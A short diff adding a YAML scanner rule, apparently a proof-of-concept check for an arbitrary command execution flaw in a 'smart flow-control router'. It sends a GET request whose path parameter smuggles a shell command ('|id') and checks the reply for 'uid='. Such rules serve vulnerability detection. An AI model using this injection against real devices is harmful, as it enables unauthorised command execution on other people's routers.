@@ -1,0 +1,12 @@
+name: 智能流控路由器-cmd 
+description: >-
+  任意命令执行
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /goform/webRead/open/?path=|id
+    expression:
+      status: 200
+      body_all:
+        - "uid="
